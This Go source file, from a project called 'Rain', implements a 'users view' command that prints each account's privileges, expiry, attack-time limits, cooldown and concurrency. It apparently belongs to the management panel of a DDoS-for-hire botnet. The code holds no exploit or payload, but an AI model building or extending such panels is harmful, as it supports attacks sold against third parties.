package subcommands

import (
	"time"
	"strconv"

	Database "Rain/core/database"
	Util "Rain/core/functions/util"
	Sessions "Rain/core/masters/sessions"
	ParseJson "Rain/core/functions/json"
	Execute "Rain/core/config/views/user"
)

func ViewUser(session *Sessions.Session, cmd []string) error {

	if len(cmd) <= 2 {
		session.Channel.Write([]byte("\x1b[38;5;15m" + ParseJson.ConfigParse.App.AppName + " -> Command Example: users view <username>\r\n"))
		return nil
	}

	for LengthControl := 2; LengthControl < len(cmd); LengthControl++ {
		User, boolen := Database.GetUser(cmd[LengthControl])
		if User == nil || !boolen {
			Execute.Execute_CustomTerm("cannot-find-user", session.User, session.Channel, true, nil)
			continue
		} else {

			DaysLeft := time.Duration(time.Until(time.Unix(User.Expiry, 0))).Hours() / 24
			SecondsLeft := time.Duration(time.Until(time.Unix(User.Expiry, 0))).Seconds()
			HoursLeft := time.Duration(time.Until(time.Unix(User.Expiry, 0))).Hours()

			session.Channel.Write([]byte("\x1b[0mUsername: " + User.Username + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mAdmin Privilege: " + Util.ColourizeBoolen(User.Admin, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mReseller Privilege: " + Util.ColourizeBoolen(User.Reseller, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mVIP Privilege: " + Util.ColourizeBoolen(User.VIP, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mRaw Privilege: " + Util.ColourizeBoolen(User.Raw, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mHolder Privilege: " + Util.ColourizeBoolen(User.Holder, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mBanned: " + Util.ColourizeBoolen(User.Banned, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mPowersaving: " + Util.ColourizeBoolen(User.Powersaving, true) + "\r\n"))
			session.Channel.Write([]byte("\x1b[0mBypassblacklist: " + Util.ColourizeBoolen(User.Bypassblacklist, true) + "\r\n"))

			session.Channel.Write([]byte("\x1b[0mDays Left: \x1b[38;5;11m" + strconv.Itoa(int(DaysLeft)) + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mHours Left: \x1b[38;5;11m" + strconv.Itoa(int(HoursLeft)) + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mSeconds Left: \x1b[38;5;11m" + strconv.Itoa(int(SecondsLeft)) + "\x1b[0m\r\n\r\n"))

			session.Channel.Write([]byte("\x1b[0mMaxTime: \x1b[38;5;11m" + strconv.Itoa(User.MaxTime) + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mMaxSessions: \x1b[38;5;11m" + strconv.Itoa(User.MaxSessions) + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mCooldown: \x1b[38;5;11m" + strconv.Itoa(User.Cooldown) + "\x1b[0m\r\n"))
			session.Channel.Write([]byte("\x1b[0mConcurrents: \x1b[38;5;11m" + strconv.Itoa(User.Concurrents) + "\x1b[0m\r\n"))
			continue
		}
	}
	return nil
}